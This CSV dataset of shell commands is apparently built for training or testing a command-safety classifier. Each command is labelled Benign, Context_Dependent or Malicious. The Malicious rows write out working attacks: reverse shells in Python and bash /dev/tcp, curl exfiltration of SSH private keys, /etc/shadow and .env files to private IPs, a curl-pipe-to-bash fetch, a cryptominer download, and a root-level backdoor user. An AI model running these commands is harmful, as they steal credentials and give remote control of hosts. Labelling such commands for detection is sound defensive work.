command,label,original_label,mitre_id
systemctl is-active prometheus,Benign,Synthetic,Synthetic
top -bn1 -o %MEM | head -15,Benign,Synthetic,Synthetic
nmap -sV 10.10.10.0/24,Context_Dependent,Synthetic,Synthetic
repquota -a,Benign,Synthetic,Synthetic
usermod -aG sudo newuser,Benign,Synthetic,Synthetic
tar -czf backup.tar.gz /home/user/data,Benign,Synthetic,Synthetic
ncat -lvnp 5555,Context_Dependent,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.50"",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
docker restart db,Benign,Synthetic,Synthetic
ls /home/deploy/,Benign,Synthetic,Synthetic
ncat -lvnp 6666,Context_Dependent,Synthetic,Synthetic
kubectl logs -f web-abc123,Benign,Synthetic,Synthetic
lspci,Benign,Synthetic,Synthetic
docker exec db ls /app,Benign,Synthetic,Synthetic
kubectl get pods -A,Benign,Synthetic,Synthetic
docker logs my-container,Benign,Synthetic,Synthetic
cat /etc/sudoers | nc 192.168.56.1 4443,Malicious,Synthetic,Synthetic
lvs,Benign,Synthetic,Synthetic
ssh -R 5432:localhost:5432 user@external,Context_Dependent,Synthetic,Synthetic
chown -R deploy:deploy /home/user/projects,Benign,Synthetic,Synthetic
base64 /home/user/.ssh/id_rsa | curl -d @- http://10.0.0.5:31337/,Malicious,Synthetic,Synthetic
pip install --upgrade next,Benign,Synthetic,Synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor,Malicious,Synthetic,Synthetic
head -50 /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
ps aux,Benign,Synthetic,Synthetic
nc -zv 10.0.0.1 22,Context_Dependent,Synthetic,Synthetic
curl -X POST -d @/opt/app/.env http://10.20.30.40:1337/exfil,Malicious,Synthetic,Synthetic
echo 'dGVzdA==' | base64 -d,Context_Dependent,Synthetic,Synthetic
dnf install -y python3,Benign,Synthetic,Synthetic
journalctl -u apache2 --no-pager -n 20,Benign,Synthetic,Synthetic
curl http://10.10.14.3:9090/shell.sh | bash,Malicious,Synthetic,Synthetic
journalctl -u mysql --no-pager -n 20,Benign,Synthetic,Synthetic
ldd /usr/bin/nginx,Benign,Synthetic,Synthetic
ip route get 8.8.8.8,Benign,Synthetic,Synthetic
umask,Benign,Synthetic,Synthetic
pidof java,Benign,Synthetic,Synthetic
du -sh /tmp,Benign,Synthetic,Synthetic
pip install --upgrade boto3,Benign,Synthetic,Synthetic
df -h /var/www,Benign,Synthetic,Synthetic
curl -s http://pool.minergate.com/dkjdjkj/xmrig -o /tmp/.xmrig && chmod +x /tmp/.xmrig && /tmp/.xmrig -o stratum+tcp://pool.minexmr.com:4444 -u wallet -p x,Malicious,Synthetic,Synthetic
pinky,Benign,Synthetic,Synthetic
pip show uvicorn,Benign,Synthetic,Synthetic
mount,Benign,Synthetic,Synthetic
ssh -N -L 3306:db:3306 user@jump,Context_Dependent,Synthetic,Synthetic
base64 /root/.ssh/id_rsa | curl -d @- http://10.10.14.5:5555/,Malicious,Synthetic,Synthetic
pstree -u,Benign,Synthetic,Synthetic
bash -i >& /dev/tcp/172.16.5.10/4443 0>&1,Malicious,Synthetic,Synthetic
pip install typescript,Benign,Synthetic,Synthetic
pidof nginx,Benign,Synthetic,Synthetic
nc -zv 192.168.1.1 80,Context_Dependent,Synthetic,Synthetic
pip show requests,Benign,Synthetic,Synthetic
nano /home/user/projects/config.yaml,Benign,Synthetic,Synthetic
python -m SimpleHTTPServer 8080,Context_Dependent,Synthetic,Synthetic
docker images,Benign,Synthetic,Synthetic
duplicity /home file:///backup/home,Benign,Synthetic,Synthetic
traceroute api.company.com,Benign,Synthetic,Synthetic
ls -lah /home/,Benign,Synthetic,Synthetic
base64 /etc/shadow | curl -d @- http://10.0.0.1/exfil,Malicious,Synthetic,Synthetic
ls -lah /usr/local/bin,Benign,Synthetic,Synthetic
who -b,Benign,Synthetic,Synthetic
netstat -an,Benign,Synthetic,Synthetic
ssh-copy-id user@server,Benign,Synthetic,Synthetic
cp /var/tmp/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
traceroute lb-01,Benign,Synthetic,Synthetic
grep ERROR /var/log/syslog,Benign,Synthetic,Synthetic
route -n,Benign,Synthetic,Synthetic
gzip access.log,Benign,Synthetic,Synthetic
